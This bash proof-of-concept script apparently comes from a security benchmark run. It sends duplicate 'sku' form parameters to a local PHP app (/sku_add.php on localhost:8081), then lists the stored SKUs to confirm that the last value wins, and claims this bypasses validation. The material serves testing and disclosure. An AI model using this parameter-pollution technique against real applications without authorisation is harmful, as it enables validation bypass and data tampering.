#!/bin/bash
# POC: Demonstrates parameter pollution vulnerability where duplicate form parameters are processed using the last value, bypassing the first parameter.
# Target: ./repo
# Created: 2025-12-01T15:53:44.719Z
# Session: benchmark-XBEN-092-24-minbdcli

# Parameter Pollution POC - Duplicate Parameter Processing Vulnerability
# Tests that duplicate parameters are processed using the last value

TARGET="http://localhost:8081"
ENDPOINT="/sku_add.php"

echo "=========================================="
echo "Parameter Pollution Vulnerability POC"
echo "=========================================="
echo ""

# Test 1: Submit duplicate 'sku' parameters - first value FIRST_VALUE, second value POLLUTION_TEST
echo "[*] Test 1: Duplicate SKU parameters (first should fail, last should win)"
echo "[*] Submitting: sku=FIRST_VALUE&name=test&description=test&sku=POLLUTION_TEST"
RESPONSE1=$(curl -s -X POST "${TARGET}${ENDPOINT}" \
  -d 'sku=FIRST_VALUE&name=test&description=test&sku=POLLUTION_TEST' \
  -w "\n%{http_code}")

HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)
BODY1=$(echo "$RESPONSE1" | head -n -1)

echo "[*] HTTP Status: $HTTP_CODE1"
echo ""

# Test 2: Verify by listing SKUs
echo "[*] Test 2: Verifying created SKU in system"
echo "[*] Fetching SKU list from sku_system.php"
VERIFY=$(curl -s -X GET "${TARGET}/sku_system.php")

# Check if POLLUTION_TEST (second parameter) is in the response
if echo "$VERIFY" | grep -q "POLLUTION_TEST"; then
    echo "[+] SUCCESS: Found 'POLLUTION_TEST' (last parameter) in SKU list"
    echo "[+] VULNERABILITY CONFIRMED: Last duplicate parameter value was used"
    VULN_FOUND=1
else
    echo "[-] 'POLLUTION_TEST' not found in response"
    VULN_FOUND=0
fi

# Check if FIRST_VALUE (first parameter) is in the response
if echo "$VERIFY" | grep -q "FIRST_VALUE"; then
    echo "[!] WARNING: Also found 'FIRST_VALUE' - may be from previous test"
else
    echo "[+] Confirmed: 'FIRST_VALUE' (first parameter) was NOT used"
fi

echo ""

# Test 3: Reverse order to confirm last-wins behavior
echo "[*] Test 3: Reverse parameter order to confirm last-wins behavior"
echo "[*] Submitting: sku=POLLUTION_TEST2&name=test&description=test&sku=LAST_WINS"
RESPONSE3=$(curl -s -X POST "${TARGET}${ENDPOINT}" \
  -d 'sku=POLLUTION_TEST2&name=test&description=test&sku=LAST_WINS' \
  -w "\n%{http_code}")

HTTP_CODE3=$(echo "$RESPONSE3" | tail -n 1)
echo "[*] HTTP Status: $HTTP_CODE3"
echo ""

# Verify the second test
echo "[*] Verifying second test..."
VERIFY3=$(curl -s -X GET "${TARGET}/sku_system.php")

if echo "$VERIFY3" | grep -q "LAST_WINS"; then
    echo "[+] SUCCESS: Found 'LAST_WINS' (last parameter) in SKU list"
    VULN_FOUND=$((VULN_FOUND + 1))
else
    echo "[-] 'LAST_WINS' not found in response"
fi

if echo "$VERIFY3" | grep -q "POLLUTION_TEST2"; then
    echo "[!] WARNING: Also found 'POLLUTION_TEST2' (first parameter)"
else
    echo "[+] Confirmed: 'POLLUTION_TEST2' (first parameter) was NOT used"
fi

echo ""
echo "=========================================="
if [ $VULN_FOUND -ge 1 ]; then
    echo "[+] PARAMETER POLLUTION VULNERABILITY CONFIRMED"
    echo "[+] Application processes last duplicate parameter value"
    echo "[+] This allows bypass of validation controls"
    exit 0
else
    echo "[-] Could not confirm vulnerability"
    exit 1
fi